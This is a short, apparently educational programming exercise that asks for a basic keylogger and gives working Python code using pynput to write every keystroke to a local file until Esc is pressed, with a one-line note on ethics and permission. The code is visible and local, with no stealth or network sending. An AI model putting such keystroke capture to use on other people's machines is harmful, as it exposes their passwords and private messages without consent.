Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers. 

code:-(pip install pynput)

from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when 'Esc' is pressed
        return False

print("Keylogger started... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
